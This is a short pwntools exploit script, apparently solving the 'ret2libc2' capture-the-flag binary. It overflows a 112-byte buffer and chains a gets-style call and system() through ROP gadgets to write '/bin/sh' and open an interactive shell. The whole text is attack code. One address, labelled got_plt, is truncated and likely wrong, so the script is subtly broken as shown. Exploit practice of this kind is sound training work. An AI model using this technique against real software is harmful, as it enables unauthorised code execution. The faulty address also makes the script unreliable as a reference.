from pwn import *

sh = process('./ret2libc2')

got_plt = 0x080460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x0804A080

payload = flat(['a' * 112, got_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
